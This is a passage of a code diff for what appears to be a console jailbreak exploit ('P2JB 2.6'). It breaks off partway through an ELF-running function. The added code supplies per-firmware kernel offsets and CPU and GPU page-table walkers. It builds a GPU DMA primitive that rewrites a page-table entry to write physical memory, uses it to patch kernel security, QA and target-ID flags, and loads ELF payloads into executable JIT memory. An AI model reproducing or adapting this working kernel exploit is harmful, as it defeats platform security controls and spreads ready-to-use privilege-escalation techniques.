@@ -15,7 +15,7 @@
 
 async function start_p2jb() {
     try {
-        const p2jb_version = "P2JB 2.3 (Y2JB port)";
+        const p2jb_version = "P2JB 2.6 (Y2JB port)";
 
         const PAGE_SIZE = 0x4000;
 
@@ -72,11 +72,36 @@ async function start_p2jb() {
         }
 
         const FW_OFFSETS_P2JB = {
-            "9.00": { DATA_BASE_ALLPROC: 0x02755D50n },
-            "9.05": { DATA_BASE_ALLPROC: 0x02755D50n },
-            "10.00": { DATA_BASE_ALLPROC: 0x02765D70n },
-            "11.00": { DATA_BASE_ALLPROC: 0x02875D70n },
-            "12.00": { DATA_BASE_ALLPROC: 0x02885E00n },
+            "9.00": {
+                DATA_BASE_ALLPROC: 0x02755D50n,
+                DATA_BASE_SECURITY_FLAGS: 0x00D72064n,
+                DATA_BASE_KERNEL_PMAP_STORE: 0x02D28B78n,
+                DATA_BASE_GVMSPACE: 0x02D8A570n
+            },
+            "9.05": {
+                DATA_BASE_ALLPROC: 0x02755D50n,
+                DATA_BASE_SECURITY_FLAGS: 0x00D73064n,
+                DATA_BASE_KERNEL_PMAP_STORE: 0x02D28B78n,
+                DATA_BASE_GVMSPACE: 0x02D8A570n
+            },
+            "10.00": {
+                DATA_BASE_ALLPROC: 0x02765D70n,
+                DATA_BASE_SECURITY_FLAGS: 0x00D79064n,
+                DATA_BASE_KERNEL_PMAP_STORE: 0x02CF0EF8n,
+                DATA_BASE_GVMSPACE: 0x02D52570n
+            },
+            "11.00": {
+                DATA_BASE_ALLPROC: 0x02875D70n,
+                DATA_BASE_SECURITY_FLAGS: 0x00D8C064n,
+                DATA_BASE_KERNEL_PMAP_STORE: 0x02E04F18n,
+                DATA_BASE_GVMSPACE: 0x02E66570n
+            },
+            "12.00": {
+                DATA_BASE_ALLPROC: 0x02885E00n,
+                DATA_BASE_SECURITY_FLAGS: 0x00D83064n,
+                DATA_BASE_KERNEL_PMAP_STORE: 0x02E1CFB8n,
+                DATA_BASE_GVMSPACE: 0x02E7E570n
+            },
         };
 
         const FW_ALIAS_P2JB = {
@@ -89,12 +114,6 @@ async function start_p2jb() {
         };
 
         function ensure_kernel_offset() {
-            try {
-                if (typeof kernel_offset === "object" && kernel_offset !== null
-                    && kernel_offset.DATA_BASE_ALLPROC !== undefined) return;
-                kernel_offset = get_kernel_offset();
-                return;
-            } catch (_) { }
 
             let key = FW_VERSION;
             if (FW_ALIAS_P2JB[key]) key = FW_ALIAS_P2JB[key];
@@ -109,6 +128,7 @@ async function start_p2jb() {
                 DATA_BASE_ALLPROC: fw.DATA_BASE_ALLPROC,
 
                 PROC_PID: 0xBCn, PROC_UCRED: 0x40n, PROC_FD: 0x48n,
+                PROC_VM_SPACE: 0x200n,
 
                 UCRED_CR_UID: 0x04n, UCRED_CR_RUID: 0x08n, UCRED_CR_SVUID: 0x0Cn,
                 UCRED_CR_NGROUPS: 0x10n, UCRED_CR_RGID: 0x14n,
@@ -118,12 +138,29 @@ async function start_p2jb() {
 
                 FILEDESC_OFILES: 0x00n, FDESCENTTBL_HDR: 0x08n,
                 FILEDESCENT_SIZE: 0x30n,
+                SIZEOF_OFILES: 0x30n,
 
                 FD_CDIR: 0x08n, FD_RDIR: 0x10n, FD_JDIR: 0x18n, KQ_FDP: 0xA8n,
+
+                SO_PCB: 0x18n,
 
                 INPCB_PKTOPTS: 0x120n, IP6PO_RTHDR: 0x70n,
 
                 PIPE_SIGIO: 0xD8n,
+
+                PMAP_PML4: 0x20n, PMAP_CR3: 0x28n,
+
+                SIZEOF_GVMSPACE: 0x100n,
+                GVMSPACE_START_VA: 0x08n,
+                GVMSPACE_SIZE: 0x10n,
+                GVMSPACE_PAGE_DIR_VA: 0x38n,
+
+                DATA_BASE_SECURITY_FLAGS: fw.DATA_BASE_SECURITY_FLAGS || null,
+                DATA_BASE_KERNEL_PMAP_STORE: fw.DATA_BASE_KERNEL_PMAP_STORE || null,
+                DATA_BASE_GVMSPACE: fw.DATA_BASE_GVMSPACE || null,
+                DATA_BASE_TARGET_ID: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x09n : null,
+                DATA_BASE_QA_FLAGS: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x24n : null,
+                DATA_BASE_UTOKEN_FLAGS: fw.DATA_BASE_SECURITY_FLAGS ? fw.DATA_BASE_SECURITY_FLAGS + 0x8Cn : null,
             };
         }
 
@@ -1529,8 +1566,686 @@ async function start_p2jb() {
 
         }
 
-        async function stage_load_elf(S) {
-            await ulog("stage_elfldr: entered (Y2JB 1.4 aioshellcode handoff)");
+        const CPU_PDE_SHIFT = {
+            PRESENT: 0, RW: 1, USER: 2, WRITE_THROUGH: 3, CACHE_DISABLE: 4,
+            ACCESSED: 5, DIRTY: 6, PS: 7, GLOBAL: 8,
+            XOTEXT: 58, PROTECTION_KEY: 59, EXECUTE_DISABLE: 63
+        };
+        const CPU_PDE_MASKS = {
+            PRESENT: 1n, RW: 1n, USER: 1n, WRITE_THROUGH: 1n, CACHE_DISABLE: 1n,
+            ACCESSED: 1n, DIRTY: 1n, PS: 1n, GLOBAL: 1n,
+            XOTEXT: 1n, PROTECTION_KEY: 0xfn, EXECUTE_DISABLE: 1n
+        };
+        const CPU_PG_PHYS_FRAME = 0x000ffffffffff000n;
+        const CPU_PG_PS_FRAME = 0x000fffffffe00000n;
+
+        function cpu_pde_field(pde, field) {
+            return Number((pde >> BigInt(CPU_PDE_SHIFT[field])) & CPU_PDE_MASKS[field]);
+        }
+
+        function cpu_walk_pt(cr3, vaddr) {
+            if (!vaddr || !cr3) throw new Error("cpu_walk_pt: invalid arguments");
+            const pml4e_index = (vaddr >> 39n) & 0x1ffn;
+            const pdpe_index = (vaddr >> 30n) & 0x1ffn;
+            const pde_index = (vaddr >> 21n) & 0x1ffn;
+            const pte_index = (vaddr >> 12n) & 0x1ffn;
+
+            const pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8n);
+            if (cpu_pde_field(pml4e, "PRESENT") !== 1) return null;
+
+            const pdp_base_pa = pml4e & CPU_PG_PHYS_FRAME;
+            const pdpe = kernel.read_qword(phys_to_dmap(pdp_base_pa) + pdpe_index * 8n);
+            if (cpu_pde_field(pdpe, "PRESENT") !== 1) return null;
+
+            const pd_base_pa = pdpe & CPU_PG_PHYS_FRAME;
+            const pde = kernel.read_qword(phys_to_dmap(pd_base_pa) + pde_index * 8n);
+            if (cpu_pde_field(pde, "PRESENT") !== 1) return null;
+            if (cpu_pde_field(pde, "PS") === 1) {
+                return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1fffffn);
+            }
+
+            const pt_base_pa = pde & CPU_PG_PHYS_FRAME;
+            const pte = kernel.read_qword(phys_to_dmap(pt_base_pa) + pte_index * 8n);
+            if (cpu_pde_field(pte, "PRESENT") !== 1) return null;
+            return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3fffn);
+        }
+
+        function phys_to_dmap(phys_addr) {
+            if (!kernel.addr.dmap_base || !phys_addr)
+                throw new Error("phys_to_dmap: invalid arguments");
+            return kernel.addr.dmap_base + phys_addr;
+        }
+
+        function virt_to_phys(virt_addr, cr3) {
+            if (!kernel.addr.dmap_base || !virt_addr)
+                throw new Error("virt_to_phys: invalid arguments");
+            cr3 = cr3 || kernel.addr.kernel_cr3;
+            return cpu_walk_pt(cr3, virt_addr);
+        }
+
+        function get_proc_cr3(proc) {
+            const vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE);
+            const pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP);
+            return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3);
+        }
+
+        function find_vmspace_pmap_offset() {
+            const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
+            const cur_scan_offset = 0x1C8n;
+            for (let i = 1; i <= 6; i++) {
+                const scan_val = kernel.read_qword(vmspace + cur_scan_offset + BigInt(i * 8));
+                const offset_diff = Number(scan_val - vmspace);
+                if (offset_diff >= 0x2C0 && offset_diff <= 0x2F0) {
+                    return cur_scan_offset + BigInt(i * 8);
+                }
+            }
+            throw new Error("failed to find VMSPACE_VM_PMAP offset");
+        }
+
+        function find_vmspace_vmid_offset() {
+            const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
+            const cur_scan_offset = 0x1D4n;
+            for (let i = 1; i <= 8; i++) {
+                const scan_offset = cur_scan_offset + BigInt(i * 4);
+                const scan_val = Number(kernel.read_dword(vmspace + scan_offset));
+                if (scan_val > 0 && scan_val <= 0x10) return scan_offset;
+            }
+            throw new Error("failed to find VMSPACE_VM_VMID offset");
+        }
+
+        const GPU_PDE_SHIFT = { VALID: 0, IS_PTE: 54, TF: 56, BLOCK_FRAGMENT_SIZE: 59 };
+        const GPU_PDE_MASKS = { VALID: 1n, IS_PTE: 1n, TF: 1n, BLOCK_FRAGMENT_SIZE: 0x1fn };
+        const GPU_PDE_ADDR_MASK = 0x0000ffffffffffc0n;
+
+        function gpu_pde_field(pde, field) {
+            return (pde >> BigInt(GPU_PDE_SHIFT[field])) & GPU_PDE_MASKS[field];
+        }
+
+        function gpu_walk_pt(vmid, virt_addr) {
+            const pdb2_addr = get_pdb2_addr(vmid);
+            const pml4e_index = (virt_addr >> 39n) & 0x1ffn;
+            const pdpe_index = (virt_addr >> 30n) & 0x1ffn;
+            const pde_index = (virt_addr >> 21n) & 0x1ffn;
+
+            const pml4e = kernel.read_qword(pdb2_addr + pml4e_index * 8n);
+            if (gpu_pde_field(pml4e, "VALID") !== 1n) return null;
+
+            const pdp_base_pa = pml4e & GPU_PDE_ADDR_MASK;
+            const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
+            const pdpe = kernel.read_qword(pdpe_va);
+            if (gpu_pde_field(pdpe, "VALID") !== 1n) return null;
+
+            const pd_base_pa = pdpe & GPU_PDE_ADDR_MASK;
+            const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
+            const pde = kernel.read_qword(pde_va);
+            if (gpu_pde_field(pde, "VALID") !== 1n) return null;
+            if (gpu_pde_field(pde, "IS_PTE") === 1n) return [pde_va, 0x200000n];
+
+            const fragment_size = gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE");
+            const offset = virt_addr & 0x1fffffn;
+            const pt_base_pa = pde & GPU_PDE_ADDR_MASK;
+            let pte_index, pte, pte_va, page_size;
+
+            if (fragment_size === 4n) {
+                pte_index = offset >> 16n;
+                pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
+                pte = kernel.read_qword(pte_va);
+                if (gpu_pde_field(pte, "VALID") === 1n && gpu_pde_field(pte, "TF") === 1n) {
+                    pte_index = (virt_addr & 0xffffn) >> 13n;
+                    pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
+                    page_size = 0x2000n;
+                } else {
+                    page_size = 0x10000n;
+                }
+            } else if (fragment_size === 1n) {
+                pte_index = offset >> 13n;
+                pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
+                page_size = 0x2000n;
+            }
+            return [pte_va, page_size];
+        }
+
+        let gpu = {};
+        gpu.dmem_size = 2n * 0x100000n;
+        gpu.fd = null;
+
+        gpu.build_command_descriptor = function (gpu_addr, size_in_bytes) {
+            const desc = malloc(16);
+            const size_in_dwords = BigInt(size_in_bytes) >> 2n;
+            const qword0 = ((gpu_addr & 0xFFFFFFFFn) << 32n) | 0xC0023F00n;
+            const qword1 = ((size_in_dwords & 0xFFFFFn) << 32n) | ((gpu_addr >> 32n) & 0xFFFFn);
+            write64(desc, qword0);
+            write64(desc + 8n, qword1);
+            return desc;
+        };
+
+        gpu.ioctl_submit_commands = function (pipe_id, cmd_count, cmd_descriptors_ptr) {
+            const submit_struct = malloc(0x10);
+            write32(submit_struct + 0x0n, BigInt(pipe_id));
+            write32(submit_struct + 0x4n, BigInt(cmd_count));
+            write64(submit_struct + 0x8n, cmd_descriptors_ptr);
+            const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0108102n, submit_struct);
+            if (ret !== 0n) throw new Error("ioctl submit failed: " + toHex(ret));
+        };
+
+        gpu.setup = function () {
+            gpu.fd = syscall(SYSCALL.open, alloc_string("/dev/gc"), O_RDWR);
+            if (gpu.fd === 0xffffffffffffffffn) throw new Error("Failed to open /dev/gc");
+
+            const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
+            const prot_rw = prot_ro | GPU_WRITE;
+
+            const victim_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
+            const transfer_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
+            const cmd_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
+
+            const curproc_cr3 = get_proc_cr3(kernel.addr.curproc);
+            const victim_real_pa = virt_to_phys(victim_va, curproc_cr3);
+
+            const result = get_ptb_entry_of_relative_va(victim_va);
+            if (!result) throw new Error("failed to setup gpu primitives");
+            const [victim_ptbe_va, page_size] = result;
+            if (!victim_ptbe_va || page_size !== gpu.dmem_size)
+                throw new Error("failed to setup gpu primitives");
+
+            if (syscall(SYSCALL.mprotect, victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn)
+                throw new Error("mprotect() error");
+
+            const initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va);
+            const cleared_victim_ptbe_for_ro = initial_victim_ptbe_for_ro & (~victim_real_pa);
+
+            gpu.victim_va = victim_va;
+            gpu.transfer_va = transfer_va;
+            gpu.cmd_va = cmd_va;
+            gpu.victim_ptbe_va = victim_ptbe_va;
+            gpu.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro;
+        };
+
+        gpu.pm4_type3_header = function (opcode, count) {
+            const packet_type = 3n;
+            const shader_type = 1n;
+            const predicate = 0n;
+            const result = (
+                (predicate & 0x0n) |
+                ((shader_type & 0x1n) << 1n) |
+                ((opcode & 0xffn) << 8n) |
+                (((count - 1n) & 0x3fffn) << 16n) |
+                ((packet_type & 0x3n) << 30n)
+            );
+            return result & 0xFFFFFFFFn;
+        };
+
+        gpu.pm4_dma_data = function (dest_va, src_va, length) {
+            const count = 6n;
+            const bufsize = Number(4n * (count + 1n));
+            const opcode = 0x50n;
+            const command_len = BigInt(length) & 0x1fffffn;
+            const pm4 = malloc(bufsize);
+
+            const dma_data_header = (
+                (0n & 0x1n) |
+                ((0n & 0x1n) << 12n) |
+                ((2n & 0x3n) << 13n) |
+                ((1n & 0x1n) << 15n) |
+                ((0n & 0x3n) << 20n) |
+                ((0n & 0x1n) << 24n) |
+                ((2n & 0x3n) << 25n) |
+                ((1n & 0x1n) << 27n) |
+                ((0n & 0x3n) << 29n) |
+                ((1n & 0x1n) << 31n)
+            ) & 0xFFFFFFFFn;
+
+            write32(pm4, gpu.pm4_type3_header(opcode, count));
+            write32(pm4 + 0x4n, dma_data_header);
+            write32(pm4 + 0x8n, src_va & 0xFFFFFFFFn);
+            write32(pm4 + 0xcn, src_va >> 32n);
+            write32(pm4 + 0x10n, dest_va & 0xFFFFFFFFn);
+            write32(pm4 + 0x14n, dest_va >> 32n);
+            write32(pm4 + 0x18n, command_len);
+            return read_buffer(pm4, bufsize);
+        };
+
+        gpu.submit_dma_data_command = function (dest_va, src_va, size) {
+            const dma_data = gpu.pm4_dma_data(dest_va, src_va, size);
+            write_buffer(gpu.cmd_va, dma_data);
+            const desc = gpu.build_command_descriptor(gpu.cmd_va, dma_data.length);
+            gpu.ioctl_submit_commands(0, 1, desc);
+            nanosleep_ms(500);
+        };
+
+        gpu.transfer_physical_buffer = function (phys_addr, size, is_write) {
+            const trunc_phys_addr = phys_addr & ~(gpu.dmem_size - 1n);
+            const offset = phys_addr - trunc_phys_addr;
+            if (offset + BigInt(size) > gpu.dmem_size)
+                throw new Error("transfer beyond direct memory size: " + size);
+
+            const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
+            const prot_rw = prot_ro | GPU_WRITE;
+
+            if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn)
+                throw new Error("mprotect() error");
+
+            const new_ptb = gpu.cleared_victim_ptbe_for_ro | trunc_phys_addr;
+            kernel.write_qword(gpu.victim_ptbe_va, new_ptb);
+
+            if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_rw) === 0xffffffffffffffffn)
+                throw new Error("mprotect() error");
+
+            let src, dst;
+            if (is_write) { src = gpu.transfer_va; dst = gpu.victim_va + offset; }
+            else { src = gpu.victim_va + offset; dst = gpu.transfer_va; }
+
+            gpu.submit_dma_data_command(dst, src, size);
+        };
+
+        gpu.write_buffer = function (addr, buf) {
+            const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
+            if (!phys_addr) throw new Error("v2p failed for " + toHex(addr));
+            write_buffer(gpu.transfer_va, buf);
+            gpu.transfer_physical_buffer(phys_addr, buf.length, true);
+        };
+
+        gpu.write_byte = function (dest, value) {
+            const buf = new Uint8Array(1);
+            buf[0] = Number(value & 0xFFn);
+            gpu.write_buffer(dest, buf);
+        };
+        gpu.write_dword = function (dest, value) {
+            const buf = new Uint8Array(4);
+            for (let i = 0; i < 4; i++) buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
+            gpu.write_buffer(dest, buf);
+        };
+
+        function alloc_main_dmem(size, prot, flag) {
+            const out = malloc(8);
+            const mem_type = 1n;
+            const size_big = typeof size === "bigint" ? size : BigInt(size);
+            const prot_big = typeof prot === "bigint" ? prot : BigInt(prot);
+            const flag_big = typeof flag === "bigint" ? flag : BigInt(flag);
+            const ret = call(sceKernelAllocateMainDirectMemory, size_big, size_big, mem_type, out);
+            if (ret !== 0n)
+                throw new Error("sceKernelAllocateMainDirectMemory() error: " + toHex(ret));
+            const phys_addr = read64(out);
+            write64(out, 0n);
+            const name_buf = alloc_string("mem");
+            const ret2 = call(sceKernelMapNamedDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big, name_buf);
+            if (ret2 !== 0n)
+                throw new Error("sceKernelMapNamedDirectMemory() error: " + toHex(ret2));
+            return read64(out);
+        }
+
+        function get_curproc_vmid() {
+            const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
+            const vmid = kernel.read_dword(vmspace + kernel_offset.VMSPACE_VM_VMID);
+            return Number(vmid);
+        }
+
+        function get_gvmspace(vmid) {
+            const vmid_big = typeof vmid === "bigint" ? vmid : BigInt(vmid);
+            const gvmspace_base = kernel.addr.data_base + kernel_offset.DATA_BASE_GVMSPACE;
+            return gvmspace_base + vmid_big * kernel_offset.SIZEOF_GVMSPACE;
+        }
+
+        function get_pdb2_addr(vmid) {
+            return kernel.read_qword(get_gvmspace(vmid) + kernel_offset.GVMSPACE_PAGE_DIR_VA);
+        }
+
+        function get_relative_va(vmid, va) {
+            if (typeof va !== "bigint") throw new Error("va must be BigInt");
+            const gvmspace = get_gvmspace(vmid);
+            const size = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_SIZE);
+            const start_addr = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_START_VA);
+            const end_addr = start_addr + size;
+            if (va >= start_addr && va < end_addr) return va - start_addr;
+            return null;
+        }
+
+        function get_ptb_entry_of_relative_va(virt_addr) {
+            const vmid = get_curproc_vmid();
+            const relative_va = get_relative_va(vmid, virt_addr);
+            if (!relative_va)
+                throw new Error("invalid virtual addr " + toHex(virt_addr) + " for vmid " + vmid);
+            return gpu_walk_pt(vmid, relative_va);
+        }
+
+        async function stage_debug_menu(S) {
+            const O = S.OFF;
+            try {
+                if (!O.DATA_BASE_SECURITY_FLAGS || !O.DATA_BASE_KERNEL_PMAP_STORE ||
+                    !O.DATA_BASE_GVMSPACE) {
+                    await ulog("stage_debug: per-FW offsets missing for " + FW_VERSION +
+                        " - skipping debug menu");
+                    return;
+                }
+                if (!S.data_base || !S.curproc) {
+                    await ulog("stage_debug: data_base/curproc missing - skipped");
+                    return;
+                }
+
+                kernel.read_buffer = (kaddr, size) => {
+                    S.kread(S.scratch_big, BigInt(kaddr), Number(size));
+                    return read_buffer(S.scratch_big, Number(size));
+                };
+                kernel.write_buffer = (kaddr, buf) => {
+                    write_buffer(S.scratch_big, buf);
+                    S.kwrite(BigInt(kaddr), S.scratch_big, buf.length);
+                };
+                kernel.addr.curproc = S.curproc;
+                kernel.addr.data_base = S.data_base;
+
+                const pmap_store = S.data_base + O.DATA_BASE_KERNEL_PMAP_STORE;
+                const pml4 = S.kread64(pmap_store + O.PMAP_PML4);
+                const cr3 = S.kread64(pmap_store + O.PMAP_CR3);
+                const dmap_base = pml4 - cr3;
+                await ulog("stage_debug: pmap_store=" + toHex(pmap_store) +
+                    " pml4=" + toHex(pml4) + " cr3=" + toHex(cr3) +
+                    " dmap_base=" + toHex(dmap_base));
+
+                const cr3_ok = cr3 !== 0n && (cr3 & 0xFFFn) === 0n && cr3 < 0x800000000n;
+                const dmap_ok = (dmap_base >> 48n) === 0xFFFFn && (dmap_base & 0xFFFn) === 0n;
+                if (!cr3_ok || !dmap_ok) {
+                    await ulog("stage_debug: pmap/dmap WRONG for FW " + FW_VERSION +
+                        " (cr3_ok=" + cr3_ok + " dmap_ok=" + dmap_ok +
+                        ") - DATA_BASE_KERNEL_PMAP_STORE likely incorrect; skipped");
+                    return;
+                }
+                kernel.addr.kernel_cr3 = cr3;
+                kernel.addr.dmap_base = dmap_base;
+
+                kernel_offset.VMSPACE_VM_PMAP = find_vmspace_pmap_offset();
+                kernel_offset.VMSPACE_VM_VMID = find_vmspace_vmid_offset();
+                await ulog("stage_debug: VMSPACE_VM_PMAP=" +
+                    toHex(kernel_offset.VMSPACE_VM_PMAP) + " VM_VMID=" +
+                    toHex(kernel_offset.VMSPACE_VM_VMID));
+
+                gpu.setup();
+                await ulog("stage_debug: gpu.setup() ok - GPU-DMA write primitive ready");
+
+                const sf_addr = S.data_base + O.DATA_BASE_SECURITY_FLAGS;
+                const tid_addr = S.data_base + O.DATA_BASE_TARGET_ID;
+                const qa_addr = S.data_base + O.DATA_BASE_QA_FLAGS;
+                const ut_addr = S.data_base + O.DATA_BASE_UTOKEN_FLAGS;
+
+                const sf0 = kernel.read_dword(sf_addr);
+                await ulog("stage_debug: security_flags before=" + toHex(sf0));
+                gpu.write_dword(sf_addr, sf0 | 0x14n);
+                const sf = kernel.read_dword(sf_addr);
+                await ulog("stage_debug: security_flags after=" + toHex(sf));
+
+                const tid0 = kernel.read_byte(tid_addr);
+                await ulog("stage_debug: target_id before=" + toHex(tid0));
+                gpu.write_byte(tid_addr, 0x82n);
+                const tid = kernel.read_byte(tid_addr);
+                await ulog("stage_debug: target_id after=" + toHex(tid));
+
+                const qa0 = kernel.read_dword(qa_addr);
+                await ulog("stage_debug: qa_flags before=" + toHex(qa0));
+                gpu.write_dword(qa_addr, qa0 | 0x10300n);
+                const qa = kernel.read_dword(qa_addr);
+                await ulog("stage_debug: qa_flags after=" + toHex(qa));
+
+                const ut0 = kernel.read_byte(ut_addr);
+                await ulog("stage_debug: utoken_flags before=" + toHex(ut0));
+                gpu.write_byte(ut_addr, ut0 | 0x1n);
+                const ut = kernel.read_byte(ut_addr);
+                await ulog("stage_debug: utoken_flags after=" + toHex(ut));
+
+                const ok = ((sf & 0x14n) === 0x14n) && ((tid & 0xffn) === 0x82n) &&
+                    ((qa & 0x10300n) === 0x10300n) && ((ut & 0x1n) === 0x1n);
+                await ulog("stage_debug: " +
+                    (ok ? "=> DEBUG MENU ENABLED" : "=> verify FAILED"));
+            } catch (e) {
+                await ulog("stage_debug: GPU debug-menu path failed: " + e.message +
+                    " (jailbreak unaffected)");
+            }
+        }
+
+        const ELF_SHADOW_MAPPING_ADDR = 0x920100000n;
+        const ELF_MAPPING_ADDR = 0x926100000n;
+
+        async function elf_parse(elf_data) {
+            const SIZE_ELF_PROGRAM_HEADER = 0x38n;
+            const SIZE_ELF_SECTION_HEADER = 0x40n;
+
+            const OFFSET_ELF_HEADER_ENTRY = 0x18n;
+            const OFFSET_ELF_HEADER_PHOFF = 0x20n;
+            const OFFSET_ELF_HEADER_SHOFF = 0x28n;
+            const OFFSET_ELF_HEADER_PHNUM = 0x38n;
+            const OFFSET_ELF_HEADER_SHNUM = 0x3cn;
+
+            const OFFSET_PROGRAM_HEADER_TYPE = 0x00n;
+            const OFFSET_PROGRAM_HEADER_FLAGS = 0x04n;
+            const OFFSET_PROGRAM_HEADER_OFFSET = 0x08n;
+            const OFFSET_PROGRAM_HEADER_VADDR = 0x10n;
+            const OFFSET_PROGRAM_HEADER_FILESZ = 0x20n;
+            const OFFSET_PROGRAM_HEADER_MEMSZ = 0x28n;
+
+            const OFFSET_SECTION_HEADER_TYPE = 0x4n;
+            const OFFSET_SECTION_HEADER_OFFSET = 0x18n;
+            const OFFSET_SECTION_HEADER_SIZE = 0x20n;
+
+            const OFFSET_RELA_OFFSET = 0x00n;
+            const OFFSET_RELA_INFO = 0x08n;
+            const OFFSET_RELA_ADDEND = 0x10n;
+
+            const RELA_ENTSIZE = 0x18n;
+
+            const elf_store = malloc(elf_data.length);
+            write_buffer(elf_store, elf_data);
+
+            const elf_entry = read64(elf_store + OFFSET_ELF_HEADER_ENTRY);
+            const elf_entry_point = ELF_MAPPING_ADDR + elf_entry;
+
+            const elf_program_headers_offset = read64(elf_store + OFFSET_ELF_HEADER_PHOFF);
+            const elf_program_headers_num = read16(elf_store + OFFSET_ELF_HEADER_PHNUM);
+
+            const elf_section_headers_offset = read64(elf_store + OFFSET_ELF_HEADER_SHOFF);
+            const elf_section_headers_num = read16(elf_store + OFFSET_ELF_HEADER_SHNUM);
+
+            let executable_start = 0n;
+            let executable_end = 0n;
+
+            for (let i = 0n; i < elf_program_headers_num; i++) {
+                const phdr_offset = elf_program_headers_offset + (i * SIZE_ELF_PROGRAM_HEADER);
+                const p_type = read32(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_TYPE);
+                const p_flags = read32(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_FLAGS);
+                const p_offset = read64(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_OFFSET);
+                const p_vaddr = read64(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_VADDR);
+                const p_memsz = read64(elf_store + phdr_offset + OFFSET_PROGRAM_HEADER_MEMSZ);
+                const aligned_memsz = (p_memsz + 0x3FFFn) & 0xFFFFC000n;
+
+                if (p_type !== 0x01n) continue;
+
+                const PROT_RW = PROT_READ | PROT_WRITE;
+
+                const PROT_X = (typeof PROT_EXEC !== "undefined")
+                    ? PROT_EXEC
+                    : (typeof PROT_EXECUTE !== "undefined" ? PROT_EXECUTE : 0x4n);
+                const PROT_RWX = PROT_READ | PROT_WRITE | PROT_X;
+
+                if ((p_flags & 0x1n) === 0x1n) {
+                    executable_start = p_vaddr;
+                    executable_end = p_vaddr + p_memsz;
+                    const exec_handle = syscall(SYSCALL.jitshm_create, 0n, aligned_memsz, 0x7n);
+                    const write_handle = syscall(SYSCALL.jitshm_alias, exec_handle, 0x3n);
+                    syscall(SYSCALL.mmap, ELF_SHADOW_MAPPING_ADDR, aligned_memsz,
+                        PROT_RW, 0x11n, write_handle, 0n);
+                    for (let j = 0n; j < p_memsz; j++) {
+                        write8(ELF_SHADOW_MAPPING_ADDR + j, read8(elf_store + p_offset + j));
+                    }
+                    syscall(SYSCALL.mmap, ELF_MAPPING_ADDR + p_vaddr, aligned_memsz,
+                        PROT_RWX, 0x11n, exec_handle, 0n);
+                } else {
+                    syscall(SYSCALL.mmap, ELF_MAPPING_ADDR + p_vaddr, aligned_memsz,
+                        PROT_RW, 0x1012n, 0xFFFFFFFFn, 0n);
+                    for (let j = 0n; j < p_memsz; j++) {
+                        write8(ELF_MAPPING_ADDR + p_vaddr + j, read8(elf_store + p_offset + j));
+                    }
+                }
+            }
+
+            for (let i = 0n; i < elf_section_headers_num; i++) {
+                const shdr_offset = elf_section_headers_offset + (i * SIZE_ELF_SECTION_HEADER);
+                const sh_type = read32(elf_store + shdr_offset + OFFSET_SECTION_HEADER_TYPE);
+                const sh_offset = read64(elf_store + shdr_offset + OFFSET_SECTION_HEADER_OFFSET);
+                const sh_size = read64(elf_store + shdr_offset + OFFSET_SECTION_HEADER_SIZE);
+                if (sh_type !== 0x4n) continue;
+                const rela_table_count = sh_size / RELA_ENTSIZE;
+                for (let j = 0n; j < rela_table_count; j++) {
+                    const rela_entry_offset = sh_offset + j * RELA_ENTSIZE;
+                    const r_offset = read64(elf_store + rela_entry_offset + OFFSET_RELA_OFFSET);
+                    const r_info = read64(elf_store + rela_entry_offset + OFFSET_RELA_INFO);
+                    const r_addend = read64(elf_store + rela_entry_offset + OFFSET_RELA_ADDEND);
+                    if ((r_info & 0xFFn) !== 0x08n) continue;
+                    let reloc_addr = ELF_MAPPING_ADDR + r_offset;
+                    const reloc_val = ELF_MAPPING_ADDR + r_addend;
+                    if (r_offset >= executable_start && r_offset < executable_end) {
+                        reloc_addr = ELF_SHADOW_MAPPING_ADDR + r_offset;
+                    }
+                    write64(reloc_addr, reloc_val);
+                }
+            }
+
+            return elf_entry_point;
+        }
+
+        async function elf_run(elf_entry_point, filepath) {
+            const rwpipe = malloc(8);
+            const rwpair = malloc(8);
+            const args = malloc(0x30);
+            const thr_handle_addr = malloc(8);
+
+            write32(rwpipe, BigInt(ipv6_kernel_rw.data.pipe_read_fd));
+            write32(rwpipe + 0x4n, BigInt(ipv6_kernel_rw.data.pipe_write_fd));
+            write32(rwpair, BigInt(ipv6_kernel_rw.data.master_sock));
